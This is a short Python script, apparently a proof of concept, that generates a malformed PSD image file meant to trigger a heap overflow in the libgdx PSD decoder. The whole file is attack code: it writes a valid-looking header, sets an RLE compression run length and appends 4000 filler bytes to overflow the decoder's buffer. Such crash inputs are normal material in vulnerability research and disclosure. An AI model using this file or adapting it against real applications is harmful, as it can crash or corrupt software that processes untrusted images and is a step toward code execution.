#!/usr/bin/env python
#libgdx psd decoder heap overflow
import struct

s=struct.pack('>L',0x38425053)#sig
s+=struct.pack('>H',1)#ver
s+='\x00'*6 #reserved

s+=struct.pack('>H',1)#channelCount
s+=struct.pack('>L',1)#h
s+=struct.pack('>L',1)#w
s+=struct.pack('>H',8)#bitdepth
s+=struct.pack('>H',3)#color format

s+=struct.pack('>L',0)
s+=struct.pack('>L',0)
s+=struct.pack('>L',0)

s+=struct.pack('>H',1)#compression

s+='aa'#skip
s+=chr(127)#length

s+="A"*4000

file('1.bin','wb').write(s)
